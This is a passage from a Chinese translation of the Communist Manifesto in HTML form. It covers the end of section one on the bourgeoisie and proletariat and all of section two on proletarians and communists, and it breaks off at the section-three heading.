但是，我们的时代，资产阶级时代，却有一个特点：它使阶级对立简单化了。整个社会日益分裂为两大敌对的阵营，分裂为两大相互直接对立的阶级：资产阶级和无产阶级。</p>\n<p>　　从中世纪的农奴中产生了初期城市的城关市民；从这个市民等级中发展出最初的资产阶级分子。</p>\n<p>　　美洲的发现、绕过非洲的航行，给新兴的资产阶级开辟了新天地。东印度和中国的市场、美洲的殖民化、对殖民地的贸易、交换手段和一般的商品的增加，使商业、航海业和工业空前高涨，因而使正在崩溃的封建社会内部的革命因素迅速发展。</p>\n<p>　　以前那种封建的或行会的工业经营方式已经不能满足随着新市场的出现而增加的需求了。工场手工业代替了这种经营方式。行会师傅被工业的中间等级排挤掉了；各种行业组织之间的分工随着各个作坊内部的分工的出现而消失了。</p>\n<p>　　但是，市场总是在扩大，需求总是在增加。甚至工场手工业也不再能满足需要了。于是，蒸汽和机器引起了工业生产的革命。现代大工业化替了工场手工业；工业中的百万富翁，一支一支产业大军的首领，现代资产者，代替了工业的中间等级。</p>\n<p>　　大工业建立了由美洲的发现所准备好的世界市场。世界市场使商业、航海业和陆路交通得到了巨大的发展。这种发展又反过来促进了工业的扩展，同时，随着工业、商业、航海业和铁路的扩展，资产阶级也在同一程度上得到发展，增加自己的资本，把中世纪遗留下来的一切阶级都排挤到后面去。</p>\n<p>　　由此可见，现代资产阶级本身是一个长期发展过程的产物，是生产方式和交换方式的一系列变革的产物。</p>\n<p>　　资产阶级的这种发展的每一个阶段，都伴随着相应的政治上进展。它在封建主统治下是被压迫的等级，在公社里是武装的和自治的团体，在一些地方组成独立的城市共和国，在另一些地方组成君主国中的纳税的第三等级；后来，在工场手工业时期，它是等级制君主国或专制君主国中同贵族抗衡的势力，而且是大君主国的主要基础；最后，从大工业和世界市场建立的时候起，它在现代的代议制国家里夺得了独占的政治统治。现代的国家政权不过是管理整个资产阶级的共同事务的委员会罢了。</p>\n<p>　　资产阶级在历史上曾经起过非常革命的作用。</p>\n<p>　　资产阶级在它已经取得了统治的地方把一切封建的、宗法的和田园诗般的关系都破坏了。它无情地斩断了把人们束缚于天然尊长的形形色色的封建羁绊，它使人和人之间除了赤裸裸的利害关系，除了冷酷无情的“现金交易”，就再也没有任何别的联系了。它把宗教虔诚、骑士热忱、小市民伤感这些情感的神圣发作，淹没在利己主义打算的冰水之中。它把人的尊严变成了交换价值，用一种没有良心的贸易自由代替了无数特许的和自力挣得的自由。总而言之，它用公开的、无耻的、直接的、露骨的剥削代替了由宗教幻想和政治幻想掩盖着的剥削。</p>\n<p>　　资产阶级抹去了一切向来受人尊崇和令人敬畏的职业的神圣光环。它把医生、律师、教士、诗人和学者变成了它出钱招雇的雇佣劳动者。</p>\n<p>　　资产阶级撕下了罩在家庭关系上的温情脉脉的面纱，把这种关系变成了纯粹的金钱关系。</p>\n<p>　　资产阶级揭示了，在中世纪深受反动派称许的那种人力的野蛮使用，是以极端怠惰作为相应补充的。它第一个证明了，人的活动能够取得什么样的成就。它创造了完全不同于埃及金字塔、罗马水道和哥特式教堂的奇迹；它完成了完全不同于民族大迁徙和十字军东征的远征。</p>\n<p>　　资产阶级除非对生产工具，从而对生产关系，从而对全部社会关系不断地进行革命，否则就不能生存下去。反之，原封不动地保持旧的生产方式，却是过去的一切工业阶级生存的首要条件。生产的不断变革，一切社会状况不停的动荡，永远的不安定和变动，这就是资产阶级时代不同于过去一切时代的地方。一切固定的僵化的关系以及与之相适应的素被尊崇的观念和见解都被消除了，一切新形成的关系等不到固定下来就陈旧了。一切等级的和固定的东西都烟消云散了，一切神圣的东西都被亵渎了。人们终于不得不用冷静的眼光来看他们的生活地位、他们的相互关系。</p>\n<p>　　不断扩大产品销路的需要，驱使资产阶级奔走于全球各地。它必须到处落户，到处开发，到处建立联系。</p>\n<p>　　资产阶级，由于开拓了世界市场，使一切国家的生产和消费都成为世界性的了。使反动派大为惋惜的是，资产阶级挖掉了工业脚下的民族基础。古老的民族工业被消灭了，并且每天都还在被消灭。它们被新的工业排挤掉了，新的工业的建立已经成为一切文明民族的生命攸关的问题；这些工业所加工的，已经不是本地的原料，而是来自极其遥远的地区的原料；它们的产品不仅供本国消费，而且同时供世界各地消费。旧的、靠国产品来满足的需要，被新的、要靠极其遥远的国家和地带的产品来满足的需要所代替了。过去那种地方的和民族的自给自足和闭关自守状态，被各民族的各方面的互相往来和各方面的互相依赖所代替了。物质的生产是如此，精神的生产也是如此。各民族的精神产品成了公共的财产。民族的片面性和局限性日益成为不可能，于是由许多种民族的和地方的文学形成了一种世界的文学。</p>\n<p>　　资产阶级，由于一切生产工具的迅速改进，由于交通的极其便利，把一切民族甚至最野蛮的民族都卷到文明中来了。它的商品的低廉价格，是它用来摧毁一切万里长城、征服野蛮人最顽强的仇外心理的重炮。它迫使一切民族——如果它们不想灭亡的话——采用资产阶级的生产方式；它迫使它们在自己那里推行所谓文明，即变成资产者。一句话，它按照自己的面貌为自己创造出一个世界。</p>\n<p>　　资产阶级使农村屈服于城市的统治。它创立了巨大的城市，使城市人口比农村人口大大增加起来，因而使很大一部分居民脱离了农村生活的愚昧状态。正象它使农村从属于城市一样，它使未开化和半开化的国家从属于文明的国家，使农民的民族从属于资产阶级的民族，使东方从属于西方。</p>\n<p>　　资产阶级日甚一日地消灭生产资料、财产和人口的分散状态。它使人口密集起来，使生产资料集中起来，使财产聚集在少数人的手里。由此必然产生的结果就是政治的集中。各自独立的、几乎只有同盟关系的、各有不同利益、不同法律、不同政府、不同关税的各个地区，现在已经结合为一个拥有统一的政府、统一的法律、统一的民族阶级利益和统一的关税的统一的民族。</p>\n<p>　　资产阶级在它的不到一百年的阶级统治中所创造的生产力，比过去一切世代创造的全部生产力还要多，还要大。自然力的征服，机器的采用，化学在工业和农业中的应用，轮船的行驶，铁路的通行，电报的使用，整个整个大陆的开垦，河川的通航，仿佛用法术从地下呼唤出来的大量人口，——过去哪一个世纪料想到在社会劳动里蕴藏有这样的生产力呢？</p>\n<p>　　由此可见，资产阶级赖以形成的生产资料和交换手段，是在封建社会里造成的。在这些生产资料和交换手段发展的一定阶段上，封建社会的生产和交换在其中进行的关系，封建的农业和工场手工业组织，一句话，封建的所有制关系，就不再适应已经发展的生产力了。这种关系已经在阻碍生产而不是促进生产了。它变成了束缚生产的桎梏。它必须被炸毁，而且已经被炸毁了。</p>\n<p>　　起而代之的是自由竞争以及与自由竞争相适应的社会制度和政治制度、资产阶级的经济统治和政治统治。</p>\n<p>　　现在，我们眼前又进行着类似的运动。资产阶级的生产关系和交换关系，资产阶级的所有制关系，这个曾经仿佛用法术创造了如此庞大的生产资料和交换手段的现代资产阶级社会，现在像一个魔法师一样不能再支配自己用法术呼唤出来的魔鬼了。几十年来的工业和商业的历史，只不过是现代生产力反抗现代生产关系、反抗作为资产阶级及其统治的存在条件的所有制关系的历史。只要指出在周期性的重复中越来越危及整个资产阶级社会生存的商业危机就够了。在商业危机期间，总是不仅有很大一部分制成的产品被毁灭掉，而且有很大一部分已经造成的生产力被毁灭掉。在危机期间，发生一种在过去一切时代看来都好象是荒唐现象的社会瘟疫，即生产过剩的瘟疫。社会突然发现自己回到了一时的野蛮状态；仿佛是一次饥荒、一场普遍的毁灭性战争，使社会失去了全部生活资料；仿佛是工业和商业全被毁灭了，——这是什么缘故呢？因为社会上文明过度，生活资料太多，工业和商业太发达。社会所拥有的生产力已经不能再促进资产阶级文明和资产阶级所有制关系的发展；相反，生产力已经强大到这种关系所不能适应的地步，它已经受到这种关系的阻碍；而它一着手克服这种障碍，就使整个资产阶级社会陷入混乱，就使资产阶级所有制的存在受到威胁。资产阶级的关系已经太狭窄了，再容纳不了它本身所造成的财富了。——资产阶级用什么办法来克服这种危机呢？一方面不得不消灭大量生产力，另一方面夺取新的市场，更加彻底地利用旧的市场。这究竟是怎样的一种办法呢？这不过是资产阶级准备更全面更猛烈的危机的办法，不过是使防止危机的手段越来越少的办法。</p>\n<p>　　资产阶级用来推翻封建制度的武器，现在却对准资产阶级自己了。</p>\n<p>　　但是，资产阶级不仅锻造了置自身于死地的武器；它还产生了将要运用这种武器的人——现代的工人，即无产者。</p>\n<p>　　随着资产阶级即资本的发展，无产阶级即现代工人阶级也在同一程度上得到发展；现代的工人只有当他们找到工作的时候才能生存，而且只有当他们的劳动增殖资本的时候才能找到工作。这些不得不把自己零星出卖的工人，像其它任何货物一样，也是一种商品，所以他们同样地受到竞争的一切变化、市场的一切波动的影响。</p>\n<p>　　由于机器的推广和分工，无产者的劳动已经失去了任何独立的性质，因而对工人也失去了任何吸引力。工人变成了机器的单纯的附属品，要求他做的只是极其简单、极其单调和极容易学会的操作。因此，花在工人身上的费用，几乎只限于维持工人生活和延续工人后代所必需的生活资料。但是，商品的价格，从而劳动的价格，是同它的生产费用相等的。因此，劳动越使人感到厌恶，工资也就越减少。不仅如此，机器越推广，分工越细致，劳动量也就越增加，这或者是由于工作时间的延长，或者是由于在一定时间内所要求的劳动的增加，机器运转的加速，等等。</p>\n<p>　　现代工业已经把家长式的师傅的小作坊变成了工业资本家的大工厂。挤在工厂里的工人群众就象士兵一样被组织起来。他们是产业军的普通士兵，受着各级军士和军官的层层监视。他们不仅是资产阶级的、资产阶级国家的奴隶，并且每日每时都受机器、受监工、首先是受各个经营工厂的资产者本人的奴役。这种专制制度越是公开地把营利宣布为自己的最终目的，它就越是可鄙、可恨和可恶。</p>\n<p>　　手的操作所要求的技巧和气力越少，换句话说，现代工业越发达，男工也就越受到女工和童工的排挤。对工人阶级来说，性别和年龄的差别再没有什么社会意义了。他们都只是劳动工具，不过因为年龄和性别的不同而需要不同的费用罢了。</p>\n<p>　　当厂主对工人的剥削告一段落，工人领到了用现钱支付的工资的时候，马上就有资产阶级中的另一部分人——房东、小店主、当铺老板等等向他们扑来。</p>\n<p>　　以前的中间等级的下层，即小工业家、小商人和小食利者，手工业者和农民——所有这些阶级都降落到无产阶级的队伍里来了，有的是因为他们的小资本不足以经营大工业，经不起较大资本家的竞争；有的是因为他们的手艺已经被新的生产方法弄得不值钱了。无产阶级的队伍就是这样从居民的所有阶级中得到补充的。</p>\n<p>　　无产阶级经历了各个不同的发展阶段。它反对资产阶级的斗争是和它的存在同时开始的。</p>\n<p>　　最初是单个的工人，然后是某一工厂的工人，然后是某一地方的某一劳动部门的工人，同直接剥削他们的单个资产者作斗争。他们不仅仅攻击资产阶级的生产关系，而且攻击生产工具本身；他们毁坏那些来竞争的外国商品，捣毁机器，烧毁工厂，力图恢复已经失去的中世纪工人的地位。</p>\n<p>　　在这个阶段上，工人们还是分散在全国各地并为竞争所分裂的群众。工人的大规模集结，还不是他们自己联合的结果，而是资产阶级联合的结果，当时资产阶级为了达到自己的政治目的必须而且暂时还能够把整个无产阶级发动起来。因此，在这个阶段上，无产者不是同自己的敌人作斗争，而是同自己的敌人的敌人作斗争，即同专制君主制的残余、地主、非工业资产阶级和小资产者作斗争。因此，整个历史运动都集中在资产阶级手里；在这种条件下取得的每一个胜利都是资产阶级的胜利。</p>\n<p>　　但是，随着工业的发展，无产阶级不仅人数增加了，而且它结合成更大的集体，它的力量日益增长，它越来越感觉到自己的力量。机器使劳动的差别越来越小，使工资几乎到处都降到同样低的水平，因而无产阶级内部的利益和生活状况也越来越趋于一致。资产者彼此间日益加剧的竞争以及由此引起的商业危机，使工人的工资越来越不稳定；机器的日益迅速的和继续不断的改良，使工人的整个生活地位越来越没有保障；单个工人和单个资产者之间的冲突越来越具有两个阶级的冲突的性质。工人开始成立反对资产者的同盟；他们联合起来保卫自己的工资。他们甚至建立了经常性的团体，以便为可能发生的反抗准备食品。有些地方，斗争爆发为起义。</p>\n<p>　　工人有时也得到胜利，但这种胜利只是暂时的。他们斗争的真正成果并不是直接取得的成功，而是工人的越来越扩大的联合。这种联合由于大工业所造成的日益发达的交通工具而得到发展，这种交通工具把各地的工人彼此联系起来。只要有了这种联系，就能把许多性质相同的地方性的斗争汇合成全国性的斗争，汇合成阶级斗争。而一切阶级斗争都是政治斗争。中世纪的市民靠乡间小道需要几百年才能达到的联合，现代的无产者利用铁路只要几年就可以达到了。</p>\n<p>　　无产者组织成为阶级，从而组织成为政党这件事，不断地由于工人的自相竞争而受到破坏。但是，这种组织总是重新产生，并且一次比一次更强大，更坚固，更有力。它利用资产阶级内部的分裂，迫使他们用法律形式承认工人的个别利益。英国的十小时工作日法案就是一个例子。</p>\n<p>　　旧社会内部的所有冲突在许多方面都促进了无产阶级的发展。资产阶级处于不断的斗争中：最初反对贵族：后来反对同工业进步有利害冲突的那部分资产阶级；经常反对一切外国的资产阶级。在这一切斗争中，资产阶级都不得不向无产阶级呼吁，要求无产阶级援助，这样就把无产阶级卷进了政治运动。于是，资产阶级自己就把自己的教育因素即反对自身的武器给予了无产阶级。</p>\n<p>　　其次，我们已经看到，工业的进步把统治阶级的整批成员拋到无产阶级队伍里去，或者至少也使他们的生活条件受到威胁。他们也给无产阶级带来了大量的教育因素。</p>\n<p>　　最后，在阶级斗争接近决战的时期，统治阶级内部的、整个旧社会内部的瓦解过程，就达到非常强烈、非常尖锐的程度，甚至使得统治阶级中的一小部分人脱离统治阶级而归附于革命的阶级，即掌握着未来的阶级。所以，正像过去贵族中有一部分人转到资产阶级方面一样，现在资产阶级中也有一部分人，特别是已经提高到从理论上认识整个历史运动这一水平的一部分资产阶级思想家，转到无产阶级方面来了。</p>\n<p>　　在当前同资产阶级对立的一切阶级中，只有无产阶级是真正革命的阶级。其余的阶级都随着大工业的发展而日趋没落和灭亡，无产阶级却是大工业本身的产物。</p>\n<p>　　中间等级，即小工业家、小商人、手工业者、农民，他们同资产阶级作斗争，都是为了维护他们这种中间等级的生存，以免于灭亡。所以，他们不是革命的，而是保守的。不仅如此，他们甚至是反动的，因为他们力图使历史的车轮倒转。如果说他们是革命的，那是鉴于他们行将转入无产阶级的队伍，这样，他们就不是维护他们目前的利益，而是维护他们将来的利益，他们就离开自己原来的立场，而站到无产阶级的立场上来。</p>\n<p>　　流氓无产阶级是旧社会最下层中消极的腐化的部分，他们在一些地方也被无产阶级革命卷到运动里来，但是，由于他们的整个生活状况，他们更甘心于被人收买，去干反动的勾当。</p>\n<p>　　在无产阶级的生活条件中，旧社会的生活条件已经被消灭了。无产者是没有财产的；他们和妻子儿女的关系同资产阶级的家庭关系再没有任何共同之处了；现代的工业劳动，现代的资本压迫，无论在英国或法国，无论在美国或德国，都是一样的，都使无产者失去了任何民族性。法律、道德、宗教，在他们看来全都是资产阶级偏见，隐藏在这些偏见后面的全都是资产阶级利益。</p>\n<p>　　过去一切阶级在争得统治之后，总是使整个社会服从于它们发财致富的条件，企图以此来巩固它们已经获得的生活地位。无产者只有废除自己的现存的占有方式，从而废除全部现存的占有方式，才能取得社会生产力。无产者没有什么自己的东西必须加以保护，他们必须摧毁至今保护和保障私有财产的一切。</p>\n<p>　　过去的一切运动都是少数人的或者为少数人谋利益的运动。无产阶级的运动是绝大多数人的、为绝大多数人谋利益的独立的运动。无产阶级，现今社会的最下层，如果不炸毁构成官方社会的整个上层，就不能抬起头来，挺起胸来。</p>\n<p>　　如果不就内容而就形式来说，无产阶级反对资产阶级的斗争首先是一国范围内的斗争。每一个国家的无产阶级当然首先应该打倒本国的资产阶级。</p>\n<p>　　在叙述无产阶级发展的最一般的阶段的时候，我们循序探讨了现存社会内部或多或少隐蔽着的国内战争，直到这个战争爆发为公开的革命，无产阶级用暴力推翻资产阶级而建立自己的统治。</p>\n<p>　　我们已经看到，至今的一切社会都是建立在压迫阶级和被压迫阶级的对立之上的。但是，为了有可能压迫一个阶级，就必须保证这个阶级至少有能够勉强维持它的奴隶般的生存的条件。农奴曾经在农奴制度下挣扎到公社社员的地位，小资产者曾经在封建专制制度的束缚下挣扎到资产者的地位。现代的工人却相反，他们并不是随着工业的进步而上升，而是越来越降到本阶级的生存条件以下。工人变成赤贫者，贫困比人口和财富增长得还要快。由此可以明显地看出，资产阶级再不能做社会的统治阶级了，再不能把自己阶级的生存条件当做支配一切的规律强加于社会了。资产阶级不能统治下去了，因为它甚至不能保证自己的奴隶维持奴隶的生活，因为它不得不让自己的奴隶落到不能养活它反而要它来养活的地步。社会再不能在它统治下生活下去了，就是说，它的存在不再同社会兼容了。</p>\n<p>　　资产阶级生存和统治的根本条件，是财富在私人手里的积累，是资本的形成和增殖；资本的条件是雇佣劳动。雇佣劳动完全是建立在工人的自相竞争之上的。资产阶级无意中造成而又无力抵抗的工业进步，使工人通过结社而达到的革命联合代替了他们由于竞争而造成的分散状态。于是，随着大工业的发展，资产阶级赖以生产和占有产品的基础本身也就从它的脚下被挖掉了。它首先生产的是它自身的掘墓人。资产阶级的灭亡和无产阶级的胜利是同样不可避免的。</p>\n<h1 id=\"二、无产者和共产党人\"><a href=\"#二、无产者和共产党人\" class=\"headerlink\" title=\"二、无产者和共产党人\"></a>二、无产者和共产党人</h1><p>　　共产党人同全体无产者的关系是怎样的呢？</p>\n<p>　　共产党人不是同其它工人政党相对立的特殊政党。</p>\n<p>　　他们没有任何同整个无产阶级的利益不同的利益。</p>\n<p>　　他们不提出任何特殊的原则，用以塑造无产阶级的运动。</p>\n<p>　　共产党人同其它无产阶级政党不同的地方只是：一方面，在各国无产者的斗争中，共产党人强调和坚持整个无产阶级共同的不分民族的利益；另一方面，在无产阶级和资产阶级的斗争所经历的各个发展阶段上，共产党人始终代表整个运动的利益。</p>\n<p>　　因此，在实践方面，共产党人是各国工人政党中最坚决的、始终起推动作用的部分；在理论方面，他们胜过其余的无产阶级群众的地方在于他们了解无产阶级运动的条件、进程和一般结果。</p>\n<p>　　共产党人的最近目的是和其它一切无产阶级政党的最近目的一样的：使无产阶级形成为阶级，推翻资产阶级的统治，由无产阶级夺取政权。</p>\n<p>　　共产党人的理论原理，决不是以这个或那个世界改革家所发明或发现的思想、原则为根据的。</p>\n<p>　　这些原理不过是现在的阶级斗争、我们眼前的历史运动的真实关系的一般表述。废除先前存在的所有制关系，并不是共产主义所独具的特征。</p>\n<p>　　一切所有制关系都经历了经常的历史更替、经常的历史变更。</p>\n<p>　　例如，法国革命废除了封建的所有制，代之以资产阶级的所有制。</p>\n<p>　　共产主义的特征并不是要废除一般的所有制，而是要废除资产阶级的所有制。</p>\n<p>　　但是，现代的资产阶级私有制是建立在阶级对立上面、建立在一些人对另一些人的剥削上面的产品生产和占有的最后而又最完备的表现。</p>\n<p>　　从这个意义上说，共产党人可以把自己的理论概括为一句话：消灭私有制。</p>\n<p>　　有人责备我们共产党人，说我们要消灭个人挣得的、自己劳动得来的财产，要消灭构成个人的一切自由、活动和独立的基础的财产。</p>\n<p>　　好一个劳动得来的、自己挣得的、自己赚来的财产！你们说的是资产阶级所有制以前的那种小资产阶级的、小农的财产吗？那种财产用不着我们去消灭，工业的发展已经把它消灭了，而且每天都在消灭它。</p>\n<p>　　或者，你们说的是现代的资产阶级的私有财产吧？</p>\n<p>　　但是，难道雇佣劳动，无产者的劳动，会给无产者创造出财产来吗？没有的事。这种劳动所创造的是资本，即剥削雇佣劳动的财产，只有在不断产生出新的雇佣劳动来重新加以剥削的条件下才能增加起来的财产。现今的这种财产是在资本和雇佣劳动的对立中运动的。让我们来看看这种对立的两个方面吧。</p>\n<p>　　做一个资本家，这就是说，他在生产中不仅占有一种纯粹个人的地位，而且占有一种社会的地位。资本是集体的产物，它只有通过社会许多成员的共同活动，而且归根到底只有通过社会全体成员的共同活动，才能运动起来。</p>\n<p>　　因此，资本不是一种个人力量，而是一种社会力量。</p>\n<p>　　因此，把资本变为公共的、属于社会全体成员的财产，这并不是把个人财产变为社会财产。这时所改变的只是财产的社会性质。它将失掉它的阶级性质。</p>\n<p>　　现在，我们来看看雇佣劳动。</p>\n<p>　　雇佣劳动的平均价格是最低限度的工资，即工人为维持其工人的生活所必需的生活资料的数额。因此，雇佣工人靠自己的劳动所占有的东西，只够勉强维持他的生命的再生产。我们决不打算消灭这种供直接生命再生产用的劳动产品的个人占有，这种占有并不会留下任何剩余的东西使人们有可能支配别人的劳动。我们要消灭的只是这种占有的可怜的性质，在这种占有下，工人仅仅为增殖资本而活着，只有在统治阶级的利益需要他活着的时候才能活着。</p>\n<p>　　在资产阶级社会里，活的劳动只是增殖已经积累起来的劳动的一种手段。在共产主义社会里，已经积累起来的劳动只是扩大、丰富和提高工人的生活的一种手段。</p>\n<p>　　因此，在资产阶级社会里是过去支配现在，在共产主义社会里是现在支配过去。在资产阶级社会里，资本具有独立性和个性，而活动着的个人却没有独立性和个性。</p>\n<p>　　而资产阶级却把消灭这种关系说成是消灭个性和自由！说对了。的确，正是要消灭资产者的个性、独立性和自由。</p>\n<p>　　在现今的资产阶级生产关系的范围内，所谓自由就是自由贸易，自由买卖。</p>\n<p>　　但是，买卖一消失，自由买卖也就会消失。关于自由买卖的言论，也象我们的资产阶级的其它一切关于自由的大话一样，仅仅对于不自由的买卖来说，对于中世纪被奴役的市民来说，才是有意义的，而对于共产主义要消灭买卖、消灭资产阶级生产关系和资产阶级本身这一点来说，却是毫无意义的。</p>\n<p>　　我们要消灭私有制，你们就惊慌起来。但是，在你们的现存社会里，私有财产对十分之九的成员来说已经被消灭了；这种私有制之所以存在，正是因为私有财产对十分之九的成员来说已经不存在。可见，你们责备我们，是说我们要消灭那种以社会上的绝大多数人没有财产为必要条件的所有制。</p>\n<p>　　总而言之，你们责备我们，是说我们要消灭你们的那种所有制。的确，我们是要这样做的。</p>\n<p>　　从劳动不再能变为资本、货币、地租，一句话，不再能变为可以垄断的社会力量的时候起，就是说，从个人财产不再能变为资产阶级财产的时候起，你们说，个性就被消灭了。</p>\n<p>　　由此可见，你们是承认，你们所理解的个性，不外是资产者、资产阶级私有者。这样的个性确实应当被消灭。</p>\n<p>　　共产主义并不剥夺任何人占有社会产品的权力，它只剥夺利用这种占有去奴役他人劳动的权力。</p>\n<p>　　有人反驳说，私有制一消灭，一切活动就会停止，懒惰之风就会兴起。</p>\n<p>　　这样说来，资产阶级社会早就应该因懒惰而灭亡了，因为在这个社会里是劳者不获，获者不劳的。所有这些顾虑，都可以归结为这样一个同义反复：一旦没有资本，也就不再有雇佣劳动了。</p>\n<p>　　所有这些对共产主义的物质产品的占有方式和生产方式的责备， 也被扩及到精神产品的占有和生产方面。正如阶级的所有制的终止在资产者看来是生产本身的终止一样，阶级的教育的终止在他们看来就等于一切教育的终止。</p>\n<p>　　资产者唯恐失去的那种教育，对绝大多数人来说是把人训练成机器。</p>\n<p>　　但是，你们既然用你们资产阶级关于自由、教育、法等等的观念来衡量废除资产阶级所有制的主张，那就请你们不要同我们争论了。你们的观念本身是资产阶级的生产关系和所有制关系的产物，正象你们的法不过是被奉为法律的你们这个阶级的意志一样，而这种意志的内容是由你们这个阶级的物质生活条件来决定的。</p>\n<p>　　你们的利己观念使你们把自己的生产关系和所有制关系从历史的、在生产过程中是暂时的关系变成永恒的自然规律和理性规律，这种利己观念是你们和一切灭亡了的统治阶级所共有的。谈到古代所有制的时候你们所能理解的，谈到封建所有制的时候你们所能理解的，一谈到资产阶级所有制你们就再也不能理解了。</p>\n<p>　　消灭家庭！连极端的激进派也对共产党人的这种可耻的意图表示愤慨。</p>\n<p>　　现代的、资产阶级的家庭是建立在什么基础上的呢？是建立在资本上面，建立在私人发财上面的。这种家庭只是在资产阶级那里才以充分发展的形式存在着，而无产者的被迫独居和公开的卖淫则是它的补充。</p>\n<p>　　资产者的家庭自然会随着它的这种补充的消失而消失，两者都要随着资本的消失而消失。</p>\n<p>　　你们是责备我们要消灭父母对子女的剥削吗？我们承认这种罪状。</p>\n<p>　　但是，你们说，我们用社会教育代替家庭教育，就是要消灭人们最亲密的关系。</p>\n<p>　　而你们的教育不也是由社会决定的吗？不也是由你们进行教育的那种社会关系决定的吗？不也是由社会通过学校等等进行的直接的或间接的干涉决定的吗？共产党人并没有发明社会对教育的影响；他们仅仅是要改变这种影响的性质，要使教育摆脱统治阶级的影响。</p>\n<p>　　无产者的一切家庭联系越是由于大工业的发展而被破坏，他们的子女越是由于这种发展而被变成单纯的商品和劳动工具，资产阶级关于家庭和教育、关于父母和子女的亲密关系的空话就越是令人作呕。</p>\n<p>　　但是，你们共产党人是要实行公妻制的啊，——整个资产阶级异口同声地向我们这样叫喊。</p>\n<p>　　资产者是把自己的妻子看作单纯的生产工具的。他们听说生产工具将要公共使用，自然就不能不想到妇女也会遭到同样的命运。</p>\n<p>　　他们想也没有想到，问题正在于使妇女不再处于单纯生产工具的地位。</p>\n<p>　　其实，我们的资产者装得道貌岸然，对所谓的共产党人的正式公妻制表示惊讶，那是再可笑不过了。公妻制无需共产党人来实行，它差不多是一向就有的。</p>\n<p>　　我们的资产者不以他们的无产者的妻子和女儿受他们支配为满足，正式的卖淫更不必说了，他们还以互相诱奸妻子为最大的享乐。</p>\n<p>　　资产阶级的婚姻实际上是公妻制。人们至多只能责备共产党人，说他们想用正式的、公开的公妻制来代替伪善地掩蔽着的公妻制。其实，不言而喻，随着现在的生产关系的消灭，从这种关系中产生的公妻制，即正式的和非正式的卖淫，也就消失了。</p>\n<p>　　还有人责备共产党人，说他们要取消祖国，取消民族。</p>\n<p>　　工人没有祖国。决不能剥夺他们所没有的东西。因为无产阶级首先必须取得政治统治，上升为民族的阶级，把自身组织成为民族，所以它本身还是民族的，虽然完全不是资产阶级所理解的那种意思。</p>\n<p>　　随着资产阶级的发展，随着贸易自由的实现和世界市场的建立，随着工业生产以及与之相适应的生活条件的趋于一致，各国人民之间的民族隔绝和对立日益消失。</p>\n<p>　　无产阶级的统治将使它们更快地消失。联合的行动，至少是各文明国家的联合的行动，是无产阶级获得解放的首要条件之一。</p>\n<p>　　人对人的剥削一消灭，民族对民族的剥削就会随之消灭。</p>\n<p>　　民族内部的阶级对立一消失，民族之间的敌对关系就会随之消失。</p>\n<p>　　从宗教的、哲学的和一般意识形态的观点对共产主义提出的种种责难，都不值得详细讨论了。</p>\n<p>　　人们的观念、观点和概念，一句话，人们的意识，随着人们的生活条件、人们的社会关系、人们的社会存在的改变而改变，这难道需要经过深思才能了解吗？</p>\n<p>　　思想的历史除了证明精神生产随着物质生产的改造而改造，还证明了什么呢？任何一个时代的统治思想始终都不过是统治阶级的思想。</p>\n<p>　　当人们谈到使整个社会革命化的思想时，他们只是表明了一个事实：在旧社会内部已经形成了新社会的因素，旧思想的瓦解是同旧生活条件的瓦解步调一致的。</p>\n<p>　　当古代世界走向灭亡的时候，古代的各种宗教就被基督教战胜了。当基督教思想在18世纪被启蒙思想击败的时候，封建社会正在同当时革命的资产阶级进行殊死的斗争。信仰自由和宗教自由的思想，不过表明自由竞争在信仰的领域里占统治地位罢了。</p>\n<p>　　“但是”，有人会说，“宗教的、道德的、哲学的、政治的、法的观念等等在历史发展的进程中固然是不断改变的，而宗教、道德、哲学、政治和法在这种变化中却始终保存着。</p>\n<p>　　此外，还存在着一切社会状态所共有的永恒的真理，如自由、正义等等。但是共产主义要废除永恒真理，它要废除宗教、道德，而不是加以革新，所以共产主义是同至今的全部历史发展进程相矛盾的。”</p>\n<p>　　这种责难归结为什么呢？至今的一切社会的历史都是在阶级对立中运动的，而这种对立在各个不同的时代具有不同的形式。</p>\n<p>　　但是，不管阶级对立具有什么样的形式，社会上一部分人对另一部分人的剥削却是过去各个世纪所共有的事实。因此，毫不奇怪，各个世纪的社会意识，尽管形形色色、千差万别，总是在某些共同的形式中运动的，这些形式，这些意识形式，只有当阶级对立完全消失的时候才会完全消失。</p>\n<p>　　共产主义革命就是同传统的所有制关系实行最彻底的决裂；毫不奇怪，它在自己的发展进程中要同传统的观念实行最彻底的决裂。</p>\n<p>　　不过，我们还是把资产阶级对共产主义的种种责难撇开吧。</p>\n<p>　　前面我们已经看到，工人革命的第一步就是使无产阶级上升为统治阶级，争得民主。</p>\n<p>　　无产阶级将利用自己的政治统治，一步一步地夺取资产阶级的全部资本，把一切生产工具集中在国家即组织成为统治阶级的无产阶级手里，并且尽可能快地增加生产力的总量。</p>\n<p>　　要做到这一点，当然首先必须对所有权和资产阶级生产关系实行强制性的干涉，也就是采取这样一些措施，这些措施在经济上似乎是不够充分的和没有力量的，但是在运动进程中它们会越出本身，而且作为变革全部生产方式的手段是必不可少的。</p>\n<p>　　这些措施在不同的国家里当然会是不同的。</p>\n<p>　　但是，最先进的国家几乎都可以采取下面的措施：</p>\n<p>　　1．剥夺地产，把地租用于国家支出。</p>\n<p>　　2．征收高额累进税。</p>\n<p>　　3．废除继承权。</p>\n<p>　　4．没收一切流亡分子和叛乱分子的财产。</p>\n<p>　　5．通过拥有国家资本和独享垄断权的国家银行，把信贷集中在国家手里。</p>\n<p>　　6．把全部运输业集中在国家手里。</p>\n<p>　　7．按照总的计划增加国营工厂和生产工具，开垦荒地和改良土壤。</p>\n<p>　　8．实行普遍劳动义务制，成立产业军，特别是在农业方面。</p>\n<p>　　9．把农业和工业结合起来，促使城乡对立逐步消灭。</p>\n<p>　　10．对所有儿童实行公共的和免费的教育。取消现在这种形式的儿童的工厂劳动。把教育同物质生产结合起来，等等。</p>\n<p>　　当阶级差别在发展进程中已经消失而全部生产集中在联合起来的个人的手里的时候，公共权力就失去政治性质。原来意义上的政治权力，是一个阶级用以压迫另一个阶级的有组织的暴力。如果说无产阶级在反对资产阶级的斗争中一定要联合为阶级，如果说它通过革命使自己成为统治阶级，并以统治阶级的资格用暴力消灭旧的生产关系，那么它在消灭这种生产关系的同时，也就消灭了阶级对立和阶级本身的存在条件，从而消灭了它自己这个阶级的统治。</p>\n<p>　　代替那存在着阶级和阶级对立的资产阶级旧社会的，将是这样一个联合体，在那里，每个人的自由发展是一切人的自由发展的条件。</p>\n<h1 id=\"三、社会主义的和共产主义的文献\"><a href=\"#三、社会主义的和共产主义的文献\" class=\"headerlink\" 